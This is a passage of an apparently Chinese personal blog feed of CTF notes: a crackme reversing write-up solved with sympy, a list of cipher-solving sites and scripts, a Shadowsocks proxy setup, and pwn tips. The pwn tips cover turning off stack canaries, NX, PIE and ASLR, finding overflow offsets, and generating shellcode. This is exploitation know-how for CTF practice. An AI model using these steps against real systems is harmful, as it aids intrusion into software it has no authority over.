class="line">.text:0040112B                 db 5 dup(90h)</div><div class="line">.text:00401130                 dd 4800h dup(0)</div><div class="line">.text:00413130 ; ---------------------------------------------------------------------------</div><div class="line">.text:00413130                 retn</div><div class="line">.text:00413130 ; ---------------------------------------------------------------------------</div><div class="line">.text:00413131                 db 83h, 0C4h, 0F0h</div><div class="line">.text:00413134                 dd 20712A70h, 0F1C75F2h, 28741C71h, 2E0671DDh, 870F574h</div><div class="line">.text:00413134                 dd 74F17169h, 0DC167002h, 0EA74C033h, 0DC261275h, 0F471E771h</div><div class="line">.text:00413134                 dd 6903740Fh, 0EB75EB70h, 0FDF7069h, 22712C70h, 0B8261F7Dh</div><div class="line">.text:00413134                 dd 2B741E71h, 3E067169h, 870F57Ch, 7CF17169h, 0DC197002h</div><div class="line">.text:00413134                 dd 41B034A3h, 75E77400h, 0E571DC12h, 7CDCF271h, 0E9706903h</div><div class="line">.text:00413134                 dd 6965E97Dh, 70B8DC70h, 3E1D7127h, 710F1971h, 0DD257019h</div><div class="line">.text:00413134                 dd 0F6700571h, 71DD0870h, 700270F2h, 70580F14h, 0F1171ECh</div><div class="line">.text:00413134                 dd 0F671EA71h, 0DD03700Fh, 0ED71ED70h, 0FE170DDh, 7F36217Eh</div><div class="line">.text:00413134                 dd 671A7D27h, 1D2A74B8h, 65690D7Eh, 67C067Fh, 1D361C7Eh</div><div class="line">.text:00413134                 dd 8BDC0E7Fh, 75EA74C8h, 7E69DC14h, 0C1F47FEFh, 0F97CFB7Fh</div><div class="line">.text:00413134                 dd 0EA7DE27Fh, 0D87E6965h, 772076B8h, 2E1A7F27h, 0DD2978B8h</div><div class="line">.text:00413134                 dd 778D0D76h, 67EF207h, 0DD261B76h, 58B80E77h, 1479EB78h</div><div class="line">.text:00413134                 dd 768DB865h, 0FF477EFh, 0F97EFB77h, 0EA7FE177h, 0B8D9768Dh</div><div class="line">.text:00413134                 dd 73F22372h, 1C756729h, 0DD2C740Fh, 66690E72h, 6740673h</div><div class="line">.text:00413134                 dd 0DD361E72h, 0DD261073h, 0E974D88Bh, 12751575h, 73ED72DCh</div><div class="line">.text:00413134                 dd 0FB730FF3h, 0E073F974h, 6966E875h, 740FD672h, 2E1D7527h</div><div class="line">.text:00413134                 dd 75DC1973h, 0DD267C19h, 742E0475h, 0F3751D08h, 16740272h</div><div class="line">.text:00413134                 dd 0ED7C58C1h, 0C1F3137Dh, 0F575EA75h, 1D03720Fh, 0EC73EC74h</div><div class="line">.text:00413134                 dd 0DF741D66h, 0F23EBDCh, 0EB227585h, 85261DFAh, 74D08B29h</div><div class="line">.text:00413134                 dd 0EBF6EB18h, 75D08BF4h, 32F2EBECh, 0E9754A3Eh, 6256F2EBh</div><div class="line">.text:00413134                 dd 0EDEB7A6Eh, 7D267C7Ah, 187DF21Ch, 70187D0Fh, 37D1D25h</div><div class="line">.text:00413134                 dd 7D69087Ch, 7C027CF4h, 0C18BDC16h, 1271ED70h, 7DEB7DDCh</div><div class="line">.text:00413134                 dd 37CC1F5h, 7DEC7C69h, 7C6966ECh, 2A780FDFh, 793E2079h</div><div class="line">.text:00413134                 dd 1C79B81Ch, 798D2874h, 0F5783606h, 79DD0878h, 780278F1h</div><div class="line">.text:00413134                 dd 0C32B0F16h, 1275EA74h, 0E7790F2Eh, 78B8F479h, 0EB78DD03h</div><div class="line">.text:00413134                 dd 78DDEB79h, 2B70B8DFh, 79662271h, 1E71C11Eh, 71692A70h</div><div class="line">.text:00413134                 dd 70F67805h, 0F271DD08h, 19700278h, 2E0C10Fh, 1471EA70h</div><div class="line">.text:00413134                 dd 0F107966h, 0F171E571h, 700278DCh, 36E979E9h, 0C1DC70DDh</div><div class="line">.text:00413134                 dd 22712B70h, 0B81E7326h, 29781E71h, 571DD3Eh, 870F572h</div><div class="line">.text:00413134                 dd 72F1711Dh, 0C1177002h, 0EA78C103h, 733E1379h, 0E671C10Fh</div></pre></td></tr></table></figure></p><p>那溢出长度是多少呢？输入aaaabbbbccccddddeeee,发现返回地址是dddd,<br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fkxzsu500uj31440g1q7v.jpg" alt=""><br>再次输入aaaabbbbccc11A<br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fkxzvguj53j31h20guady.jpg" alt=""><br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fkxzw6hh09j319v08rabc.jpg" alt=""><br>黑色，这里右键-分析-从模块删除分析<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fkxzzfg35gj31ah0bwgod.jpg" alt=""><br>这里出现花指令(代码混淆，花指令不影响程序运行。就是看耐心。就拿这个题目来说。花指令就是跳来跳去。可以脱去，其实不脱话也一样的)<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fky059od5wj30k309zq4f.jpg" alt=""><br>一步一步分析<br>在0x413131位置设置新断点，回车断下，忽略花指令，仅摘录算法相关代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">00413131    83C4 F0         add esp,-0x10</div><div class="line">00413150    33C0            xor eax,eax</div><div class="line">00413184    A3 34B04100     mov dword ptr ds:[0x41B034],eax </div><div class="line">004131BA    58              pop eax          //aaaa</div><div class="line">004131EB    8BC8            mov ecx,eax</div><div class="line">0041321F    58              pop eax     //bbbb</div><div class="line">00413254    8BD8            mov ebx,eax</div><div class="line">00413289    58              pop eax   //cccc</div><div class="line">004132B5    8BD0            mov edx,eax</div><div class="line">004132AD    8BD0            mov edx,eax</div><div class="line">004132E2    8BC1            mov eax,ecx  //eax=aaaa</div><div class="line">00413316    2BC3            sub eax,ebx   //ebx=bbbb eax=a-b</div><div class="line">00413349    C1E0 02         shl eax,0x2    //(a-b)*4</div><div class="line">00413380    03C1            add eax,ecx     //(a-b)*4+a</div><div class="line">004133B5    03C2            add eax,edx     //(a-b)*4+a+c</div><div class="line">004133E9    2D E217F9EA     sub eax,0xEAF917E2   ///0xEAF917E2==((a-b)*4+a+c)</div><div class="line"></div><div class="line">00413B1E    58              pop eax                ; ctf2017_.00413E3E</div><div class="line">00413B4E    35 0E210100     xor eax,0x1210E</div><div class="line">00413B83    3305 34B04100   xor eax,dword ptr ds:[0x41B034]</div><div class="line">0040103F    68 38B04100     push ctf2017_.0041B038         &quot;Bad register-code&quot;</div><div class="line"></div><div class="line">00413455    03C1            add eax,ecx     //ecx=aaaa</div><div class="line">00413489    2BC3            sub eax,ebx    //ebx=bbbb</div><div class="line">004134BF    8BD8            mov ebx,eax    //ebx=eax=a-b</div><div class="line">004134F3    D1E0            shl eax,1   //(a-b)*2</div><div class="line">00413525    03C3            add eax,ebx  //(a-b)*3</div><div class="line">00413559    03C1            add eax,ecx   //(a-b)*3+a</div><div class="line">0041358F    8BC8            mov ecx,eax //</div><div class="line">004135C3    03C2            add eax,edx   //(a-b)*3+a+c</div><div class="line">004135F7    2D C808F5E8     sub eax,0xE8F508C8 //(a-b)*3+a+c==0xE8F508C8</div><div class="line"></div><div class="line">00413665    8BC1            mov eax,ecx</div><div class="line">0041365D    8BC1            mov eax,ecx //(a-b)*3+a</div><div class="line">004136A7    2BC2            sub eax,edx  //(a-b)*3+a-c</div><div class="line">004136D8    2D 683C0A0C     sub eax,0xC0A3C68 // (a-b)*3+a-c==0xC0A3C68</div></pre></td></tr></table></figure></p><p>求解<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(a-b)*3+a-c==0xC0A3C68</div><div class="line">(a-b)*3+a+c==0xE8F508C8</div><div class="line">(a-b)*4+a+c==0xEAF917E2</div></pre></td></tr></table></figure></p><p>以参考了许多大神的代码<br>学到了一种解决方程的方法，贼好用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">from sympy import *</div><div class="line">a=Symbol(&apos;a&apos;)</div><div class="line">b=Symbol(&apos;b&apos;)</div><div class="line">c=Symbol(&apos;c&apos;)</div><div class="line">print (solve([(a-b)*3+a-c-0xC0A3C68,(a-b)*3+a+c-0xE8F508C8,(a-b)*4+a+c-0xEAF917E2],[a,b,c]))</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;去膜拜看雪师傅啦&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CTF中的解密</title>
    <link href="http://yoursite.com/2017/10/23/misc_mima/"/>
    <id>http://yoursite.com/2017/10/23/misc_mima/</id>
    <published>2017-10-23T11:35:11.729Z</published>
    <updated>2017-11-27T08:38:57.079Z</updated>
    
    <content type="html"><![CDATA[<p>ctf必备解密网站<br><a id="more"></a></p><h2 id="1、密码"><a href="#1、密码" class="headerlink" title="1、密码"></a>1、密码</h2><p>维吉尼亚<br><a href="https://www.guballa.de/vigenere-solver" target="_blank" rel="external">https://www.guballa.de/vigenere-solver</a><br>brainfuck密码<br><a href="https://www.nayuki.io/page/brainfuck-interpreter-javascript" target="_blank" rel="external">https://www.nayuki.io/page/brainfuck-interpreter-javascript</a><br>字符串转16进制<br><a href="http://www.3464.com/tools/StrToHex/" target="_blank" rel="external">http://www.3464.com/tools/StrToHex/</a><br>进制转换(这里如果这个数太大，这里可以解决)<br><a href="https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;tn=baidu&amp;wd=10%E8%BD%AC%E6%8D%A2%E6%88%90%E4%BA%8C%E8%BF%9B%E5%88%B6&amp;oq=10%25E8%25BD%25AC%25E6%258D%25A216&amp;rsv_pq=b2aaa4a900006164&amp;rsv_t=c585GpBLAmvpieM48PKR9QDP%2BJpsW3F14XD8RRkUVGrt%2BgnKSqffNWd8R4s&amp;rqlang=cn&amp;rsv_enter=1&amp;rsv_sug3=1&amp;rsv_sug1=1&amp;rsv_sug7=100&amp;bs=10%E8%BD%AC%E6%8D%A216" target="_blank" rel="external">https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;tn=baidu&amp;wd=10%E8%BD%AC%E6%8D%A2%E6%88%90%E4%BA%8C%E8%BF%9B%E5%88%B6&amp;oq=10%25E8%25BD%25AC%25E6%258D%25A216&amp;rsv_pq=b2aaa4a900006164&amp;rsv_t=c585GpBLAmvpieM48PKR9QDP%2BJpsW3F14XD8RRkUVGrt%2BgnKSqffNWd8R4s&amp;rqlang=cn&amp;rsv_enter=1&amp;rsv_sug3=1&amp;rsv_sug1=1&amp;rsv_sug7=100&amp;bs=10%E8%BD%AC%E6%8D%A216</a><br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1flkweshdyqj30qz0a4mxy.jpg" alt=""><br>md5<br><a href="http://www.dmd5.com/" target="_blank" rel="external">http://www.dmd5.com/</a><br>生成二维码<br><a href="http://tool.chinaz.com/qrcode" target="_blank" rel="external">http://tool.chinaz.com/qrcode</a><br>词频分析<br><a href="https://quipqiup.com/" target="_blank" rel="external">https://quipqiup.com/</a><br>libc库查询<br><a href="http://libcdb.com/" target="_blank" rel="external">http://libcdb.com/</a><br>栅栏密码<br><a href="http://www.qqxiuzi.cn/bianma/zhalanmima.php" target="_blank" rel="external">http://www.qqxiuzi.cn/bianma/zhalanmima.php</a><br>解密代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">char s[]= <span class="string">"tn c0afsiwal kes,hwit1r  g,npt  ttessfu&#125;ua u  hmqik e &#123;m,  n huiouosarwCniibecesnren."</span>;  </div><div class="line">char t[<span class="number">86</span>]= <span class="string">""</span>;  </div><div class="line">int i,j,k;</div><div class="line">k=<span class="number">0</span>;</div><div class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">17</span>;i++)  </div><div class="line">&#123;  </div><div class="line">      <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">5</span>;j++)  </div><div class="line">      &#123;  </div><div class="line">                t[k++]= ch[j*<span class="number">17</span>+i];  </div><div class="line">      &#125;  </div><div class="line">&#125;  </div><div class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">85</span>;i++)</div><div class="line">&#123;</div><div class="line">    printf(<span class="string">"%c"</span>,t[i]);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>当铺密码<br>王夫 井工 夫口 由中人 井中 夫夫 由中大：67 84 70 123 82 77 125<br>凯撒密码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python </span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line">__author__ = <span class="string">'ByStudent'</span></div><div class="line">lstr=<span class="string">"""U8Y]:8KdJHTXRI&gt;XU#?!K_ecJH]kJG*bRH7YJH7YSH]*=93dVZ3^S8*$:8"&amp;:9U]RH;g=8Y!U92'=j*$KH]ZSj&amp;[S#!gU#*dK9\."""</span></div><div class="line"><span class="keyword">for</span> p <span class="keyword">in</span> range(<span class="number">127</span>):</div><div class="line">    str1 = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lstr:</div><div class="line">        temp = chr((ord(i)+p)%<span class="number">127</span>)</div><div class="line">        <span class="keyword">if</span> <span class="number">32</span>&lt;ord(temp)&lt;<span class="number">127</span> :</div><div class="line">            str1 = str1 + temp</div><div class="line">            feel = <span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">             feel = <span class="number">0</span></div><div class="line">             <span class="keyword">break</span></div><div class="line">    <span class="keyword">if</span> feel == <span class="number">1</span>:</div><div class="line">         print(str1)</div></pre></td></tr></table></figure></p><p>莫斯密码<br><a href="http://www.jb51.net/tools/morse.htm" target="_blank" rel="external">http://www.jb51.net/tools/morse.htm</a><br>希尔密码<br>密文： 22,09,00,12,03,01,10,03,04,08,01,17 （明文：wjamdbkdeibr）<br>解题思路：使用的矩阵是 1 2 3 4 5 6 7 8 10<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># -*- coding: utf-8 -*-</div><div class="line">__Url__ = &apos;Http://www.purpleroc.com&apos;</div><div class="line">__author__ = &apos;Tracy_梓朋&apos;</div><div class="line">from numpy import *</div><div class="line">Dic = &#123;chr(i+97):i for i in range(26)&#125;</div><div class="line">def decode(pwd, org):</div><div class="line">    temp = []</div><div class="line">    result = []</div><div class="line">    while True:</div><div class="line">        if len(pwd) % 3 != 0:</div><div class="line">            pwd.append(pwd[-1])</div><div class="line">        else:</div><div class="line">            break</div><div class="line">    for i in pwd:</div><div class="line">        temp.append(Dic.get(i))</div><div class="line">    temp = array(temp)</div><div class="line">    temp = temp.reshape(len(pwd)/3, 3)</div><div class="line">    #print temp</div><div class="line">    #print org</div><div class="line">    xx = matrix(temp)*org</div><div class="line">    for j in range(len(pwd)/3):</div><div class="line">        for i in range(3):</div><div class="line">            if (int(xx[j, i]) &gt;= 26):</div><div class="line">                result.append(chr(xx[j, i] % 26 + 97))</div><div class="line">                #print xx[j, i] % 26</div><div class="line">            else:</div><div class="line">                #print xx[j, i]</div><div class="line">                result.append(chr(xx[j, i] + 97))</div><div class="line">    return result</div><div class="line">def get_vmatrix(org):</div><div class="line">    org_adjoin = org.I*linalg.det(org)</div><div class="line">    print org_adjoin</div><div class="line">    org_det = int(str(abs(linalg.det(org))).split(&apos;.&apos;)[0])</div><div class="line">    print org_det</div><div class="line">    for i in range(1, 26):</div><div class="line">        if i * org_det % 26 == 1:</div><div class="line">            break</div><div class="line">    org_mod = -org_adjoin * i % 26</div><div class="line">    org_mod = matrix(org_mod)</div><div class="line">    temp = []</div><div class="line">    for i in range(org_mod.shape[0]):</div><div class="line">        for j in range(org_mod.shape[1]):</div><div class="line">            temp.append(int(str(org_mod[i, j]).split(&apos;.&apos;)[0]))</div><div class="line">    org_final = matrix(temp).reshape(org_mod.shape[0], org_mod.shape[1])</div><div class="line">    #print org_final</div><div class="line">    return org_final</div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    &apos;&apos;&apos; for test</div><div class="line">    pwd = list(&quot;act&quot;)</div><div class="line">    org = matrix(array([[6, 24, 1], [13 , 16, 10], [20, 17, 15]]))</div><div class="line">    result = decode(pwd, org)</div><div class="line">    print &quot;&quot;.join(result)</div><div class="line">    deorg = matrix(array([[8, 5, 10], [21 , 8, 21], [21, 12, 8]]))</div><div class="line">    result = decode(result, deorg)</div><div class="line">    print &quot;&quot;.join(result)</div><div class="line">    &apos;&apos;&apos;</div><div class="line">    pwd = &quot;wjamdbkdeibr&quot;</div><div class="line">    pwd = list(pwd)</div><div class="line">    org = matrix(array([[1,2,3],[4,5,6],[7,8,10]]))</div><div class="line">    org_vm = get_vmatrix(org)</div><div class="line">    print org_vm</div><div class="line">    print &quot;Your flag is :&quot; + &quot;&quot;.join(decode(pwd, org_vm))</div></pre></td></tr></table></figure></p><p>unicode编码，时间戳<br><a href="http://tool.chinaz.com/Tools/Unicode.aspx" target="_blank" rel="external">http://tool.chinaz.com/Tools/Unicode.aspx</a></p><p>手机密码(最后一位不能超过4,85(错))<br><img src="http://ww1.sinaimg.cn/large/006rgqhqly1fl0d49b95aj30el0a8dlz.jpg" alt=""><br>键盘密码（123–x,y）</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ctf必备解密网站&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>vps-翻墙访问Google浏览器</title>
    <link href="http://yoursite.com/2017/10/22/vpn/"/>
    <id>http://yoursite.com/2017/10/22/vpn/</id>
    <published>2017-10-22T08:38:43.737Z</published>
    <updated>2017-11-09T11:57:47.774Z</updated>
    
    <content type="html"><![CDATA[<p>穿越万里长城只为你——Google<br><a id="more"></a></p><h2 id="1、为何翻墙"><a href="#1、为何翻墙" class="headerlink" title="1、为何翻墙"></a>1、为何翻墙</h2><p>因为我们这个地方世界太小，需求太多，寻找学习资源</p><h2 id="2、准备工具"><a href="#2、准备工具" class="headerlink" title="2、准备工具"></a>2、准备工具</h2><p>这里是下面需要用到的工具<br>链接：<a href="http://pan.baidu.com/s/1o8JYSps" target="_blank" rel="external">http://pan.baidu.com/s/1o8JYSps</a> 密码：03lo</p><h2 id="3、开始"><a href="#3、开始" class="headerlink" title="3、开始"></a>3、开始</h2><p>1、购买一台服务器(vps)作为跳板，可以访问国外站(ping www.google.com),这里可以买:<a href="https://www.vultr.com/" target="_blank" rel="external">https://www.vultr.com/</a><br>买好以后如下:<br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1fkrf36cz8dj319z0lmdib.jpg" alt=""><br>第一个箭头可以查看用户名和密码，第二个可以远程连接国外服务器(这里也可以用PuTTY连接，上面工具里有)<br>2、准备翻墙客户端——Shadowsocks.exe<br>工具开启已经给出，运行exe程序即可<br>使用<br><a href="https://www.landiannews.com/archives/20932.html" target="_blank" rel="external">https://www.landiannews.com/archives/20932.html</a><br>3、准备chrome的插件SwitchyOmega<br>这里有个链接:<a href="https://jingyan.baidu.com/article/11c17a2c121c0ff446e39d16.html" target="_blank" rel="external">https://jingyan.baidu.com/article/11c17a2c121c0ff446e39d16.html</a></p><p>换个姿势理解<br>这里有个链接：<a href="https://www.diycode.cc/topics/738" target="_blank" rel="external">https://www.diycode.cc/topics/738</a></p><p>这里前面弄了好久，然而没有用,下面是我用的方式<br>克隆（不知道为什么没有克隆下来）<br><code>git clone https://github.com/clowwindy/shadowsocks-libev.git</code><br>下载<br><code>wget https://github.com/clowwindy/shadowsocks-libev/archive/master.zip</code><br>解压<br><code>unzip master.zip</code><br>运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">sudo apt-get update</div><div class="line">sudo apt-get install shadowsocks</div><div class="line">cd shadowsocks-libev</div><div class="line">sudo apt-get install build-essential autoconf libtool libssl-dev gawk debhelper</div><div class="line">sudo dpkg-buildpackage</div><div class="line">cd ..</div><div class="line">sudo dpkg -i shadowsocks*.deb</div></pre></td></tr></table></figure></p><p>编辑配置<br><code>sudo vim /etc/shadowsocks/config.json</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">        &quot;server&quot;:&quot;45.63.17.127&quot;,</div><div class="line">        &quot;server_port&quot;:8989,</div><div class="line">        &quot;local_port&quot;:1080,</div><div class="line">        &quot;password&quot;:&quot;lala&quot;,</div><div class="line">        &quot;timeout&quot;:300,</div><div class="line">        &quot;method&quot;:&quot;aes-256-cfb&quot;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>查看进程<br><code>netstat -pantu</code></p><p>启动服务<br><code>ss-server -c /etc/shadowsocks/config.json</code><br>成功<br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1fkskajl16oj30en01qq2u.jpg" alt=""></p><p>改为后台运行<br><code>nohup ss-server -c /etc/shadowsocks/config.json &amp;</code></p><p>本机配置，运行exe<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fkskabr9eqj30ck09yt8w.jpg" alt=""><br>浏览器chrome插件<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1fksknxvxi1j311h0fg3zm.jpg" alt=""></p><h2 id="4、测试"><a href="#4、测试" class="headerlink" title="4、测试"></a>4、测试</h2><p><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fkskbbjg3rj30wu0j3n15.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;穿越万里长城只为你——Google&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PWN从开始到开始--pwn题的一些小技巧</title>
    <link href="http://yoursite.com/2017/10/14/pwn_tools/"/>
    <id>http://yoursite.com/2017/10/14/pwn_tools/</id>
    <published>2017-10-14T11:13:32.798Z</published>
    <updated>2017-12-06T13:52:34.463Z</updated>
    
    <content type="html"><![CDATA[<p>pwn题必备的套路<br><a id="more"></a></p><h2 id="1、工具"><a href="#1、工具" class="headerlink" title="1、工具"></a>1、工具</h2><p>首先安装pwntools<br><code>git clone https://github.com/Gallopsled/pwntools</code><br><code>cd pwntools</code><br><code>python setup.py install</code><br>安装peda<br><code>git clone https://github.com/longld/peda.git ~/peda</code><br><code>echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</code><br>编译x86程序依赖<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install build-essential module-assistant  </div><div class="line">sudo apt-get install gcc-multilib g++-multilib</div></pre></td></tr></table></figure></p><p>生成x86文件<br><code>gcc -m32 -no-pie -fno-stack-protector -z execstack -o stack1 stack1.c</code><br>-no-pie会关掉PIE,-fno-stack-protector和-z execstack这两个参数会分别关掉Stack Protector和NX</p><h2 id="2、找到返回地址"><a href="#2、找到返回地址" class="headerlink" title="2、找到返回地址"></a>2、找到返回地址</h2><p>x86-如下<br>gdb ./pwn<br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1fki2xlxs3fj30jl0i7q9n.jpg" alt=""><br>‘a’*112+addr_ret<br>或者<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">pattern create <span class="number">200</span></div><div class="line">pattern search <span class="number">0x4141313d</span></div></pre></td></tr></table></figure></p><p>或者<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ipython</div><div class="line">cyclic(<span class="number">200</span>)</div><div class="line">cyclic_find('aapa')</div></pre></td></tr></table></figure></p><p>x64<br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fkhzy1yhrgj30eq06eq42.jpg" alt=""></p><h2 id="3、生成shellcode"><a href="#3、生成shellcode" class="headerlink" title="3、生成shellcode"></a>3、生成shellcode</h2><p>这个联网才可以<br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1fki08gsy4bj30fv08nabr.jpg" alt=""><br>结果如下<br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fki09ch88bj30gn0c80tp.jpg" alt=""></p><h2 id="4、找内存中函数地址"><a href="#4、找内存中函数地址" class="headerlink" title="4、找内存中函数地址"></a>4、找内存中函数地址</h2><p>这需要程序跑完,在gdb里<br><code>p system</code><br><code>p callsystem</code><br>查看内存<br><code>x \16x 0x482054</code><br><code>x \gx rsp</code></p><h2 id="5、搭建pwn题目"><a href="#5、搭建pwn题目" class="headerlink" title="5、搭建pwn题目"></a>5、搭建pwn题目</h2><p>查看是否开启随机化(不是0则开启)<br><code>cat /proc/sys/kernel/randomize_va_space</code><br>关闭随机化<br><code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code><br>搭建题目<br><code>socat tcp-l:4000,fork exec:./pwn</code><br>连接测试<br><code>nc 127.0.0.1 4000</code></p><h2 id="6、coredump"><a href="#6、coredump" class="headerlink" title="6、coredump"></a>6、coredump</h2><p>在/etc/profile中加入以下一行，这将允许生成coredump文件<br><code>ulimit -c unlimited</code><br>在rc.local中加入以下一行，这将使程序崩溃时生成的coredump文件位于/tmp目录下<br><code>echo /tmp/core.%e.%p &gt; /proc/sys/kernel/core_pattern</code><br>调试coredump文件<br><code>gdb ./test test.core</code><br>x64找到溢出地点<br><code>x \100x $esp-100</code></p><h2 id="7、libc查询-然而我并没有查到"><a href="#7、libc查询-然而我并没有查到" class="headerlink" title="7、libc查询(然而我并没有查到)"></a>7、libc查询(然而我并没有查到)</h2><p><a href="http://libcdb.com/" target="_blank" rel="external">http://libcdb.com/</a></p><h2 id="8、查找到gadget"><a href="#8、查找到gadget" class="headerlink" title="8、查找到gadget"></a>8、查找到gadget</h2><p><img src="https://i.imgur.com/DVWbSy1.png" alt=""></p><h2 id="9、ELF"><a href="#9、ELF" class="headerlink" title="9、ELF"></a>9、ELF</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">elf = ELF(&apos;./pwn&apos;)</div><div class="line">gets_plt = symbols[&apos;gets&apos;]</div><div class="line">buf = elf.bss()</div></pre></td></tr></table></figure><h2 id="10、学不完的套路"><a href="#10、学不完的套路" class="headerlink" title="10、学不完的套路"></a>10、学不完的套路</h2><p>程序段<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">./le1 &amp;</div><div class="line">pidof le1</div><div class="line">cat /proc/<span class="number">1705</span>(pid)/maps</div></pre></td></tr></table></figure></p><p><img src="" alt=""><br>gdb里面的返向跑<br><code>recored</code><br>程序流程<br><code>ltrace ./le1</code><br>看调用了那些函数<br><code>strace ./le1</code><br>制作 call syscall和shellcode<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div 